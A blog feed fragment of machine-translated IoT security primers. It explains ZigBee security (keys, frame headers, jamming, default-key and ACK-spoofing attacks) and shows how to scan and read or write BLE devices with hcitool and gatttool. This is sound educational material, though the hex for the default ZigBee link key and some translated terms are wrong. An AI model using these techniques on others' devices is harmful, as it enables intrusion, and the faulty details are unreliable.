      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-6.ZigBee安全（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-6-101-zigbee-security-101/</id>
    <published>2021-09-22T14:50:22.000Z</published>
    <updated>2021-11-07T13:42:09.814Z</updated>
    <content type="html"><![CDATA[<div align="center"><br><img src="/img/icons8-zigbee-480.png" align><br></div>

<h2 id="ZigBee_安全_101">ZigBee 安全 101</h2><p>该博客是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 部分到第 5 部分），我强烈建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-5-101-zigbee-protocol-101/">物联网安全 – 第 5 部分（ZigBee 协议 - 101）</a><br>在本文中，我们将讨论 ZigBee 协议的安全架构以及 ZigBee 设备和网络中存在的安全问题。</p>
<a id="more"></a>
<h2 id="ZigBee_安全架构（开放信任）">ZigBee 安全架构（开放信任）</h2><p>ZigBee 中的安全架构补充或增强了 IEEE 802.15.4 层的安全服务。它是一种基于某些假设的“开放信任”模型，如下所述：</p>
<ul>
<li>在单个设备上运行的不同层和应用程序相互信任。</li>
<li>同一设备上不同堆栈层之间的通信不加密。</li>
<li>除非受到保护，否则设备不会有意或无意地将密钥传输到其他设备，例如在密钥传输期间。</li>
<li>两个设备之间的通信采用密码加密和安全保护。</li>
<li>随机数生成器按加密引擎的预期工作</li>
<li>硬件防篡改</li>
</ul>
<p><strong>ZigBee安全架构设计原则：</strong></p>
<ul>
<li>产生帧的层负责最初保护它。</li>
<li>只有具有活动网络密钥的设备才能与网络上的多跳通信。</li>
<li>APS 层和 NWK 层都可以使用相同的活动网络密钥来保护帧。重用密钥有助于减少存储开销。</li>
<li>端到端消息安全，即只有源设备和目的设备才能解密共享密钥保护的消息，路由机制是出于信任考虑。</li>
<li>组成网络的设备负责网络中节点的基本安全级别、安全策略和身份验证。如果需要，应用层可以在两个设备之间提供额外的应用级安全性。</li>
</ul>
<h3 id="信任中心">信任中心</h3><p>信任中心是在 ZigBee 网络内其他设备信任的设备上运行的应用程序，用于分发网络密钥和潜在的端到端应用程序配置管理。每个网络只能存在一个信任中心，它可以是协调器或协调器指定的设备，所有成员节点都将此设备视为信任中心。信任中心负责 <em> 配置和维护网络安全策略 </em> 建立端到端的应用密钥。* 通过使用一些密钥建立协议来生成密钥</p>
<h2 id="ZigBee_中的安全模式">ZigBee 中的安全模式</h2><ul>
<li><p>分布式安全模式<br>网络中不需要分布式安全模式，唯一的信任中心，路由器负责终端设备认证。设备上预先配置了链接密钥，网络密钥在设备加入网络时由路由器发布。网络中所有节点的网络密钥保持不变；这使得分布式安全模式的安全性降低。</p>
</li>
<li><p>集中安全模式<br>应用中使用的集中安全模式，一个信任中心控制，维护网络和设备的集中安全策略。在这种模式下，信任中心负责</p>
</li>
<li><p>维护整个网络的安全和安全配置</p>
</li>
<li>验证设备并维护网络上的设备列表</li>
<li>维护网络中所有设备的链接密钥和网络密钥</li>
</ul>
<h2 id="ZigBee_安全密钥">ZigBee 安全密钥</h2><p>ZigBee 标准定义了两种对称密钥，每种长度为 128 位，用于加密通信。</p>
<ul>
<li><p>网络密钥<br>用于广播通信和任何网络层通信的 128 位网络密钥。每个节点都需要网络密钥才能与网络上的其他设备进行安全通信。网络上的设备通过网络上的密钥传递，即key-transport，获取网络密钥。只有一种类型的网络密钥；但是，它可以用于分布式或集中式安全模型。安全模型控制网络密钥的分发方式，并可控制网络帧计数器的初始化方式。安全模型不影响消息的保护方式。</p>
</li>
<li><p>链接键<br>两个设备共享的 128 位唯一链接密钥，用于 APL 对等实体之间的单播通信。设备可以通过网络上的密钥传输服务或预安装获取链接密钥。信任中心链接密钥有两种不同类型：全局和唯一。本地设备使用的信任中心链接密钥的类型决定了设备如何处理各种信任中心消息（APS 命令），包括是否应用 APS 加密。每个节点还可能具有以下预配置的链接密钥，用于派生信任中心链接密钥。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>号码</th>
<th>键名</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>集中安全全球信任中心链接密钥</td>
<td>用于加入集中式安全网络的链接密钥。集中式安全全球信任中心链接密钥的默认值是ZigBeeAlliance09，即（“5A 69 67 42 99 23 65 65 41 6C 6C 69 61 6E 63 65 30 39”），如果没有其他链接，设备会使用或支持密钥由应用程序在加入时指定</td>
</tr>
<tr>
<td>2</td>
<td>分布式安全全局链接密钥</td>
<td>用于加入分布式安全网络的链接密钥</td>
</tr>
<tr>
<td>3</td>
<td>安装代码链接密钥</td>
<td>从加入设备的安装代码派生的链接密钥，以创建用于加入的唯一信任中心链接密钥</td>
</tr>
<tr>
<td>4</td>
<td>应用链接键</td>
<td>两个设备之间使用的链接密钥用于应用层加密</td>
</tr>
<tr>
<td>5</td>
<td>设备特定的信任中心链接密钥</td>
<td>信任中心和网络中的设备之间使用的链接密钥。用于信任中心命令和应用层加密。</td>
</tr>
</tbody>
</table>
<h3 id="密钥管理">密钥管理</h3><p>ZigBee 规范提到了三种不同的密钥管理机制</p>
<ul>
<li>预安装 – 在带外设备上配置或安装密钥</li>
<li>密钥传输——信任中心通过网络向设备发送安全密钥。</li>
<li>密钥建立——信任中心和终端设备协商密钥，并且在没有实际通过网络发送任何密钥的情况下建立密钥。此密钥建立基于对称密钥建立 (SKKE) 协议。</li>
</ul>
<h2 id="ZigBee_协议安全">ZigBee 协议安全</h2><h3 id="辅助安全头">辅助安全头</h3><p>如果 NWK 帧控制字段中的安全控制位设置为 1，ZigBee NWK 层和 APS 层可以使用 Auxiliary Security Header 进行安全通信。 Auxiliary Security Header 具有以下字段</p>
<table>
<thead>
<tr>
<th>字节：1</th>
<th>字节数：4</th>
<th>八位字节：0 或 8</th>
<th>八位字节：0 或 1</th>
</tr>
</thead>
<tbody>
<tr>
<td>安全控制</td>
<td>帧计数器</td>
<td>源地址</td>
<td>密钥序列号</td>
</tr>
</tbody>
</table>
<p>下面是 ZigBee 数据包的示例快照，其中 NWK 帧控制中的安全字段设置为 true (1)，安全标头设置了相应的安全控制字段，以及消息完整性代码 (MIC)</p>
<div align="center"><br><img src="/img/ZigBee_data.png" align><br></div>

<h3 id="安全控制">安全控制</h3><p>8 位安全控制字段由安全级别、密钥标识符和扩展的 nonce 子字段组成，如下所示</p>
<table>
<thead>
<tr>
<th>少量</th>
<th>0 - 2</th>
<th>3 - 4</th>
<th>5</th>
<th>6 - 7</th>
</tr>
</thead>
<tbody>
<tr>
<td>描述</td>
<td>安全级别</td>
<td>密钥标识符</td>
<td>扩展随机数</td>
<td>预订的</td>
</tr>
</tbody>
</table>
<ul>
<li>安全级别<br>安全级别标识符指示如何保护传出帧，据称如何保护传入帧。它还指示有效载荷是否被加密以及提供的帧上的数据真实性的程度，如消息完整性代码 (MIC) 的长度所反映的。MIC 的位长可以取值 0、32、64 或 128，并确定 MIC 的随机猜测正确的概率。下面列出的安全级别的安全属性</li>
</ul>
<table>
<thead>
<tr>
<th>安全级别标识符</th>
<th>安全属性</th>
<th>数据加密</th>
<th>帧完整性（MIC 的长度 M，以八位字节数表示）</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>没有任何</td>
<td>离开</td>
<td>否 (M=0)</td>
</tr>
<tr>
<td>0x01</td>
<td>MIC-32</td>
<td>离开</td>
<td>是 (M=4)</td>
</tr>
<tr>
<td>0x02</td>
<td>MIC-64</td>
<td>离开</td>
<td>是 (M=8)</td>
</tr>
<tr>
<td>0x03</td>
<td>MIC-128</td>
<td>离开</td>
<td>是 (M=16)</td>
</tr>
<tr>
<td>0x04</td>
<td>启动</td>
<td>不</td>
<td>(M=0)</td>
</tr>
<tr>
<td>0x05</td>
<td>ENC-MIC-32</td>
<td>在</td>
<td>是 (M=4)</td>
</tr>
<tr>
<td>0x06</td>
<td>ENC-MIC-64</td>
<td>在</td>
<td>是 (M=8)</td>
</tr>
<tr>
<td>0x07</td>
<td>ENC-MIC-128</td>
<td>在</td>
<td>是 (M=16)</td>
</tr>
</tbody>
</table>
<ul>
<li>密钥标识符<br>密钥标识符子字段由两个比特组成，用于标识用于加密帧的密钥。</li>
</ul>
<table>
<thead>
<tr>
<th>密钥标识符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>一个数据键</td>
</tr>
<tr>
<td>0x01</td>
<td>网络密钥</td>
</tr>
<tr>
<td>0x02</td>
<td>钥匙传输钥匙</td>
</tr>
<tr>
<td>0x03</td>
<td>钥匙加载钥匙</td>
</tr>
</tbody>
</table>
<ul>
<li>扩展随机数<br>当设置为 1 时，扩展的 nonce 子字段指示发送方地址字段存在于辅助报头中。否则，它设置为 0。</li>
</ul>
<h3 id="帧计数器">帧计数器</h3><p>计数器字段用于提供帧新鲜度并防止处理重复帧。</p>
<h3 id="源地址">源地址</h3><p>安全控制中的源地址字段是源设备的扩展 64 位地址，当安全控制字段的扩展 nonce 子字段设置为 1 时出现。</p>
<h3 id="密钥序列号">密钥序列号</h3><p>辅助安全报头中的密钥序列号表示用于保护帧的网络密钥的密钥序列号。来自安全控制字段的密钥标识符子字段，当设置为 1（即网络密钥）时，指示存在于辅助安全报头中的密钥序列号。</p>
<h2 id="ZigBee_漏洞">ZigBee 漏洞</h2><p><code>设备之间的安全性取决于安全密钥的安全初始化和安装</code></p>
<p>ZigBee 网络中的漏洞分为两类：协议漏洞和产品开发过程中协议执行不力。下面是一些常见的漏洞：</p>
<h3 id="实施漏洞">实施漏洞</h3><p><strong>安全密钥存储不安全</strong><br>ZigBee 协议要求所有安全密钥（网络、链接）长期存储在设备上。如果密钥没有安全存储，密钥可以通过对固件二进制文件进行逆向工程来识别密钥的位置。</p>
<p><strong>无线不安全的密钥传输</strong><br>在一些实现中，当节点第一次加入 ZigBee 网络时，节点通过空中获取其密钥，主要是从协调器以明文格式。因此，嗅探器设备网络狙击手或粗糙设备可以从协调器获取密钥，并可以危及整个网络。</p>
<p><strong>能量耗尽攻击</strong><br>以下是两种非常常见的能量消耗攻击</p>
<ul>
<li><p>无效的安全标头<br>在此类攻击中，攻击者在帧中发送带有无效安全标头的突发数据包，目的是使设备必须花费一些能量来验证帧完整性，从而导致目标设备更快地耗尽电池电量。</p>
</li>
<li><p>投票率<br>在此类攻击中，攻击者将数据包发送到终端设备的速度比网络配置的轮询速率更快，从而导致目标设备更快耗尽电池电量。</p>
</li>
</ul>
<h3 id="协议漏洞">协议漏洞</h3><h4 id="网络干扰漏洞">网络干扰漏洞</h4><p>IEEE802.15.4/ZigBee 标准针对无线电和网络干扰提供了一定的保护机制，但是攻击者可以利用某些技术来干扰网络<br>以下是 ZigBee 网络中可能存在的两种类型的干扰攻击：</p>
<ul>
<li><p>无线电干扰<br>在此类攻击中，攻击者会增加给定信道的无线电信号发射，导致无线电信道的信噪比降低。</p>
</li>
<li><p>链路层干扰<br>在此类攻击中，攻击者通过以随机间隔或针对特定节点的特定间隔在网络上传输带有无用数据的随机 ZigBee 帧突发来瞄准 MAC 层，从而导致网络中的丢包和 DoS 攻击。</p>
</li>
</ul>
<h4 id="链接密钥漏洞">链接密钥漏洞</h4><p>ZigBee 标准具有开放信任的安全模型，低于标准的漏洞会导致链接密钥相关攻击</p>
<ul>
<li><p>默认链接键<br>ZigBee 标准为链接密钥提供了默认值，以确保不同制造商的 ZigBee 设备之间的互操作性；因此，攻击者可以使用流氓设备以默认网络密钥加入网络。</p>
</li>
<li><p>未加密的链接密钥<br>当没有预配置密钥的设备尝试加入网络时，在这种情况下，信任中心会向设备发送一个未加密的单个密钥（默认链接密钥），攻击者可以通过嗅探导致 ZigBee 网络受损的网络通信来获取。</p>
</li>
<li><p>重用链接键<br>ZigBee 标准允许重新使用链接密钥重新加入网络；在这种情况下，攻击者可以克隆合法设备并伪装成之前连接的设备并希望重新加入网络来欺骗信任中心的网络层。因此，信任中心然后发送使用先前使用的链接密钥加密的密钥。</p>
</li>
</ul>
<h4 id="未经身份验证的_ACK_帧漏洞">未经身份验证的 ACK 帧漏洞</h4><p>确认帧是 IEEE 802.15.4/ZigBee 标准中网络层的一部分，但仅限于网络层帧传输的确认，不为确认包提供帧完整性和机密性保护。以下是 ZigBee 网络中一些常见的 ACK 攻击。两者都需要链路层干扰。</p>
<ul>
<li><p>ACK欺骗<br>在此类攻击中，攻击者对网络进行干扰，使合法设备收不到帧，然后攻击者向发送方发送带有正确序列号的ACK帧，从而导致网络中的数据丢失。</p>
</li>
<li><p>确认丢弃<br>在此类攻击中，攻击者对网络进行干扰，使得只有从接收方到发送方的 ACK 帧被阻塞，迫使发送方重新传输数据，直到达到最大重传次数，从而耗尽网络带宽和设备电池电量。</p>
</li>
<li><p>重放保护漏洞<br>IEEE 802.15.4 具有重放保护机制。它提到如果帧序列号等于或小于从同一源节点接收到的前一帧的序列号，则节点可以丢弃接收到的帧。在此类攻击中，攻击者可以向目标节点发送序列号较大的帧，迫使目标节点丢弃序列号较小的帧。</p>
</li>
</ul>
<h2 id="结论">结论</h2><p>我们希望这篇博客能让您简要了解 ZigBee 协议的安全架构。本博客中涵盖的漏洞要么是由于缺乏安全的设计和实现，要么是由于 ZigBee 协议的固有漏洞。</p>
<p>继续下一部分 -<a href>物联网安全 - 第 7 部分（逆向工程物联网固件）</a></p>
<h2 id="参考">参考</h2><ul>
<li><ol>
<li><a href="https://standards.ieee.org/standard/802_15_4-2020.html" target="_blank" rel="external">802.15.4-2020 - IEEE 批准的低速率无线网络标准草案</a></li>
</ol>
</li>
<li><ol start="2">
<li><a href="https://zigbeealliance.org/wp-content/uploads/2019/11/docs-05-3474-21-0csg-zigbee-specification.pdf" target="_blank" rel="external">ZigBee 规范 - 05-3474-21，2015 年 8 月 5 日</a></li>
</ol>
</li>
<li><ol start="3">
<li><a href="http://www.zigbee.org/" target="_blank" rel="external">ZigBee 联盟</a></li>
</ol>
</li>
<li><ol start="4">
<li><a href="https://en.wikipedia.org/wiki/IEEE_802.15.4" target="_blank" rel="external">IEEE 802.15.4 维基百科</a></li>
</ol>
</li>
<li><ol start="5">
<li><a href="https://en.wikipedia.org/wiki/Zigbee" target="_blank" rel="external">ZigBee 维基百科</a></li>
</ol>
</li>
</ul>
<p><em>原文链接：<a href="https://payatu.com/blog/dattatray/zigbee-security-101" target="_blank" rel="external">https://payatu.com/blog/dattatray/zigbee-security-101</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<div align="center"><br><img src="/img/icons8-zigbee-480.png" align=""/><br></div>

<h2 id="ZigBee_安全_101">ZigBee 安全 101</h2><p>该博客是“物联网安全”系列的一部分。如果您还没有阅读本系列之前的博客（第 1 部分到第 5 部分），我强烈建议您先阅读它们，除非您已经熟悉这些概念并且只想阅读当前主题。<br><a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分（101 - 物联网介绍和架构）</a><br><a href="/2021/09/22/IOT/iot-security-part-5-101-zigbee-protocol-101/">物联网安全 – 第 5 部分（ZigBee 协议 - 101）</a><br>在本文中，我们将讨论 ZigBee 协议的安全架构以及 ZigBee 设备和网络中存在的安全问题。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-4.低功耗蓝牙BLE（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-4-101-bluetooth-low-energy-101/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-4-101-bluetooth-low-energy-101/</id>
    <published>2021-09-22T12:50:22.000Z</published>
    <updated>2021-11-07T06:00:37.883Z</updated>
    <content type="html"><![CDATA[<p>如果您还没有看我们的物联网安全系列的第 1 部分到第 3 部分，我建议您先阅读它们，除非您已经熟悉 IoT 的基础知识。上一篇博客的链接——<a href="/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/">物联网安全——第 3 部分</a>。<br>蓝牙一直是一个流行词，因为人们希望他们的所有设备都是智能的，这意味着您可以不需要线缆就可以跨设备控制其他设备。蓝牙已经进入市场十多年了。如果您是千禧一代，您可能会使用过那些带有蓝牙功能的经典诺基亚手机。蓝牙是由爱立信发明的，随后其他厂商也开始使用蓝牙。不久之后，主要终端厂商一起都创建了一个名为<a href="https://en.wikipedia.org/wiki/Bluetooth_Special_Interest_Group" target="_blank" rel="external">蓝牙特别兴趣小组- SIG的联盟</a>，该联盟管理制定蓝牙标准以及不同版本之间的互操作性。<br>我们不打算谈论蓝牙。蓝牙本身就是一个庞大的协议栈，它们的规范大约有2000 多页。在本博客中，我将仅介绍更为著名的 BLE 蓝牙低功耗。<br><a id="more"></a></p>
<p>随着万物互联时代的到来，随之而来的是能量和资源的问题。正如我上面提到的，蓝牙是一个巨大的协议栈。在像健身手环这样的终端设备中实现它需要耗费很多的能量和资源。因此，在蓝牙 4.0 标准中，他们引入了一种称为 Low energy 的技术，专门针对在内存和功率受限的设备上运行的物联网和智能设备。</p>
<div align="center"><br><img src="/img/2021092150941367.jpg" align><br></div>

<p>Bluetooth SIG 开始将该标准作为 <a href="https://www.laptopmag.com/articles/just-what-is-bluetooth-4-0-anyway" target="_blank" rel="external">Bluetooth Smart</a>进行销售。它有两个组件，Bluetooth Smart设备是只有蓝牙低功耗组件的终端设备，Bluetooth Ready是能够同时执行Bluetooth LE 和 EDR-Bluetooth经典组件的设备，这可能是您的中心设备，如手机或笔记本电脑。<br>现在让我们来看看蓝牙规范的技术细节</p>
<div align="center"><br><img src="/img/202109212961815527.gif" align><br></div>

<p>来源：<a href="https://archive.eetindia.co.in/www.eetindia.co.in/STATIC/ARTICLE_IMAGES/201312/EEIOL_2013DEC13_RFD_NET_TA_01Tab1.gif" target="_blank" rel="external">https://archive.eetindia.co.in/www.eetindia.co.in/STATIC/ARTICLE_IMAGES/201312/EEIOL_2013DEC13_RFD_NET_TA_01Tab1.gif</a></p>
<p>该表本身将使您更好地了解规格、范围和带宽已减少以承受低功耗和低资源。<br>正如我之前提到的，LE 有两种不同类型的设备。</p>
<p><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">Bluetooth Smart Ready</a>- 这是电池供电和高资源的中央设备，能够运行所有蓝牙协议。它们是您的笔记本电脑和手机。</p>
<div align="center"><br><img src="/img/3391617601.jpg" align><br></div>

<p><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">Bluetooth Smart</a>– 它们是您的终端设备，如健身追踪器、行李追踪器或智能假阳具。他们不必运行整个堆栈，他们需要节省电力和资源。它们仅运行 Bluetooth LE 服务器。它们是中央设备可以连接的外围设备。</p>
<div align="center"><br><img src="/img/170392843.jpg" align><br></div>

<p>蓝牙和 LE 堆栈详细信息超出了本文的范围。<br>但是我们将关注的两个重要组件是 GAT 和 GAPP，它们负责 BLE 服务的运行。</p>
<div align="center"><br><img src="/img/Bluetooth_stack.jpg" align><br></div>

<h2 id="Generic_Access_Profile_(GAP)_通用访问配置文件">Generic Access Profile (GAP) 通用访问配置文件</h2><p><a href="https://www.bluetooth.com/specifications/assigned-numbers/generic-access-profile" target="_blank" rel="external">GAP</a>定义了您与中央和外围设备的通信和连接应该如何工作。</p>
<div align="center"><br><img src="/img/Bluetooth_GAP.jpg" align><br></div>

<h2 id="Generic_Attribute_(GATT)通用属性_(GATT)">Generic Attribute (GATT)通用属性 (GATT)</h2><p><a href="https://www.bluetooth.com/specifications/gatt/generic-attributes-overview" target="_blank" rel="external">GATT</a>就像一个管理您的数据需要如何处理的服务器。<br>您的Bluetooth LE 设备按照服务器-客户端原理工作。在这里，您的终端设备/外围设备充当运行 GATT 服务器的服务器，而您的中央设备充当客户端。因此，您的最终应用程序或工具连接到 GATT 服务器并从设备请求数据。<br>在您的 GATT 服务器内。有三个组成部分。</p>
<ul>
<li><ol>
<li><a href="http://dev.ti.com/tirex/content/simplelink_cc2640r2_sdk_1_40_00_45/docs/blestack/ble_user_guide/html/ble-stack-3.x/gatt.html" target="_blank" rel="external">Profile</a> – Bluetooth SIG 定义，它可以基于设备的类型，可以是血压设备或温度传感器，也可以是任何最常用的具有互操作性优势的设备。</li>
</ol>
</li>
<li><ol start="2">
<li><a href="https://www.bluetooth.com/specifications/gatt/services" target="_blank" rel="external">Services</a> - 每个设备内部都有多个参数。假设设备可以有名称、固件版本、OTA 功能、设备操作。它们被分组到称为服务的特定数据集。</li>
</ol>
</li>
<li><ol start="3">
<li><a href="https://www.bluetooth.com/specifications/gatt/characteristics" target="_blank" rel="external">Characteristics</a> - 在您的服务中放置您的数据。它可以是 16 位Bluetooth SIG 派生特征或特定于供应商的 128 位特征。</li>
</ol>
</li>
</ul>
<p>简而言之，service就像一个文件夹，characteristics是保存数据的文件。</p>
<div align="center"><br><img src="/img/GATT.png" align><br></div>

<p>现在我们了解了什么是低功耗蓝牙及其工作原理的基础知识。让我们来看看有关如何访问 BLE 设备的一些工具和方法。<br>如果您使用的是 Windows，我会认真建议您使用 Ubuntu，因为它带有所有必要的工具来访问 ble 设备并从亚马逊获得那些便宜的蓝牙 4.0 模块。（有些笔记本电脑不附带它。）</p>
<h3 id="连接蓝牙适配器：">连接蓝牙适配器：</h3><ul>
<li><ol>
<li>将蓝牙 USB 模块连接到笔记本电脑的空闲 USB 端口。（无需从主机安装任何驱动程序）。</li>
</ol>
</li>
<li><ol start="2">
<li>连接后，打开终端并输入”sudo hciconfig “， 您应该能够看到此窗口，该窗口为您提供 mac 地址（蓝牙USB模块），并且应该显示 UP and RUNNING。</li>
</ol>
</li>
<li><ol start="3">
<li>如果您遇到任何问题，请通过”sudo hciconfig hci0 reset”重新启动蓝牙接口→这会很方便。<div align="center"><br><img src="/img/connect_ble.png" align><br></div>

</li>
</ol>
</li>
</ul>
<h3 id="扫描蓝牙设备">扫描蓝牙设备</h3><ul>
<li><ol>
<li>成功将蓝牙适配器连接到机器后</li>
</ol>
</li>
<li><ol start="2">
<li>您现在可以使用”sudo hcitool lescan”扫描您周围的所有 ble 设备<div align="center"><br><img src="/img/scan_ble.png" align><br></div>
</li>
</ol>
</li>
<li><ol start="3">
<li>您将看到带有名称和 MAC 地址的设备列表。</li>
</ol>
</li>
<li><ol start="4">
<li>通过关闭和打开设备并找出差异来找出设备的 mac。</li>
</ol>
</li>
<li><ol start="5">
<li>现在获取有关该设备的更多信息。执行”sudo hcitool leinfo –random <mac>“ –random 取决于类型寻址。</mac></li>
</ol>
</li>
</ul>
<div align="center"><br><img src="/img/scan_ble.png" align><br></div>

<ul>
<li><ol start="6">
<li>您将获得基本信息，例如蓝牙设备的制造商。</li>
</ol>
</li>
</ul>
<h3 id="读取和写入数据">读取和写入数据</h3><ul>
<li>获得设备的MAC地址后。将其保存在一个文件中。它会很有用。</li>
<li>连接到智能设备的 GATT 服务器。我们使用名为 gatttool 的工具。</li>
<li>使用这个命令”sudo gatttool -I -b <mac> -t random “你会得到一个像这样的CLI并输入”connect”。<div align="center"><br><img src="/img/connected_ble.png" align><br></div></mac></li>
<li>现在您可以通过使用”primary”、”characteristics”和”char-desc”查看设备中运行的所有UUID来查看设备上运行的特性和服务。<div align="center"><br><img src="/img/bluetooth_primary.png" align><br></div>

</li>
</ul>
<div align="center"><br><img src="/img/bluetooth_characteristics.png" align><br></div>

<ul>
<li>现在您可以使用”char-read-hnd <handle> “和” char-write-req <handle> <data> “读取和写入这些句柄来读取和写入它。<div align="center"><br><img src="/img/4150880507.png" align><br></div>

</data></handle></handle></li>
</ul>
<div align="center"><br><img src="/img/Selection_278.png" align><br></div>

<ul>
<li>这里的字符属性为您提供了句柄的权限，如读取、写入、通知、指示。<div align="center"><br><img src="/img/2634211564.png" align><br></div>

</li>
</ul>
<div align="center"><br><img src="/img/177460243.png" align><br></div>

<ul>
<li>您也可以通过将“01”写入句柄来启用通知</li>
</ul>
<div align="center"><br><img src="/img/182114208.png" align><br></div>

<p>您可以查看我们的<a href="https://payatu.com/blog/Arun-Magesh/smartmassager_re" target="_blank" rel="external">其他博客</a>，了解如何逆向智能按摩器的蓝牙通信。</p>
<h2 id="参考：">参考：</h2><p><a href="https://www.nordicsemi.com/eng/News/ULP-Wireless-Update/A-short-history-of-Bluetooth" target="_blank" rel="external">https://www.nordicsemi.com/eng/News/ULP-Wireless-Update/A-short-history-of-Bluetooth</a><br><a href="https://www.bluetooth.com/specifications/gatt/generic-attributes-overview" target="_blank" rel="external">https://www.bluetooth.com/specifications/gatt/generic-attributes-overview</a><br><a href="https://www.bluetooth.com/specifications" target="_blank" rel="external">https://www.bluetooth.com/specifications</a><br><a href="https://learn.adafruit.com/introduction-to-bluetooth-low-energy/gatt" target="_blank" rel="external">https://learn.adafruit.com/introduction-to-bluetooth-low-energy/gatt</a><br><a href="https://www.oreilly.com/library/view/getting-started-with/9781491900550/ch01.html" target="_blank" rel="external">https://www.oreilly.com/library/view/getting-started-with/9781491900550/ch01.html</a><br><a href="https://en.wikipedia.org/wiki/Bluetooth_Low_Energy" target="_blank" rel="external">https://en.wikipedia.org/wiki/Bluetooth_Low_Energy</a><br><a href="https://www.jaredwolff.com/blog/get-started-with-bluetooth-low-energy/" target="_blank" rel="external">https://www.jaredwolff.com/blog/get-started-with-bluetooth-low-energy/</a><br><a href="http://object-network.blogspot.com/2014/01/scanning-ble-adverts-from-linux.html" target="_blank" rel="external">http://object-network.blogspot.com/2014/01/scanning-ble-adverts-from-linux.html</a><br><a href="https://elinux.org/images/3/32/Doing_Bluetooth_Low_Energy_on_Linux.pdf" target="_blank" rel="external">https://elinux.org/images/3/32/Doing_Bluetooth_Low_Energy_on_Linux.pdf</a><br><a href="https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf" target="_blank" rel="external">https://www.digikey.com/Web%20Export/Supplier%20Content/Laird_776/PDF/laird-wireless-bluetooth-smart-ready.pdf</a></p>
<p><em>原文链接：<a href="https://payatu.com/blog/Arun-Magesh/iot-security-part-4-bluetooth-low-energy-101" target="_blank" rel="external">https://payatu.com/blog/Arun-Magesh/iot-security-part-4-bluetooth-low-energy-101</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>如果您还没有看我们的物联网安全系列的第 1 部分到第 3 部分，我建议您先阅读它们，除非您已经熟悉 IoT 的基础知识。上一篇博客的链接——<a href="/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/">物联网安全——第 3 部分</a>。<br>蓝牙一直是一个流行词，因为人们希望他们的所有设备都是智能的，这意味着您可以不需要线缆就可以跨设备控制其他设备。蓝牙已经进入市场十多年了。如果您是千禧一代，您可能会使用过那些带有蓝牙功能的经典诺基亚手机。蓝牙是由爱立信发明的，随后其他厂商也开始使用蓝牙。不久之后，主要终端厂商一起都创建了一个名为<a href="https://en.wikipedia.org/wiki/Bluetooth_Special_Interest_Group">蓝牙特别兴趣小组- SIG的联盟</a>，该联盟管理制定蓝牙标准以及不同版本之间的互操作性。<br>我们不打算谈论蓝牙。蓝牙本身就是一个庞大的协议栈，它们的规范大约有2000 多页。在本博客中，我将仅介绍更为著名的 BLE 蓝牙低功耗。<br>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-3.物联网10大安全漏洞（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/"/>
    <id>http://www.youngroe.com/2021/09/22/IOT/iot-security-part-3-101-iot-top-ten-vulnerabilities/</id>
    <published>2021-09-22T11:50:22.000Z</published>
    <updated>2021-11-06T09:27:15.956Z</updated>
    <content type="html"><![CDATA[<p>如果您还没有阅读我们的 IoT 安全博客系列的第 1 部分和第 2 部分，我建议您先阅读它们，除非您已经熟悉基础知识并且只想阅读 IoT 十大漏洞。</p>
<p>说到十大漏洞，我们首先想到的是OWASP。为什么不呢，毕竟他们是定义 Web 和移动应用 10 大漏洞的先驱。我是 OWASP 的粉丝，这仅仅是因为 OWASP 社区多年来为定义应用程序安全问题、为行业提供免费教程和开源工具以减轻风险和漏洞所做的工作。您很有可能没有听说过 OWASP 或从他们的网站上阅读过内容，但是如果您没有，我强烈建议您访问他们的网站  <a href="https://www.owasp.org" target="_blank" rel="external">https://www.owasp.org</a></p>
<p>OWASP 还启动了物联网安全计划，社区定义了物联网攻击面和物联网前 10 大漏洞，以及Web和移动设备10大漏洞。他们的方向是正确的，很快它就会成为学习物联网安全内容的绝佳场所。</p>
<a id="more"></a>
<p>OWASP网站物联网安全相关内容如下：</p>
<ul>
<li><ol>
<li>OWASP Web Top 10项目： – <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</a></li>
</ol>
</li>
<li><ol start="2">
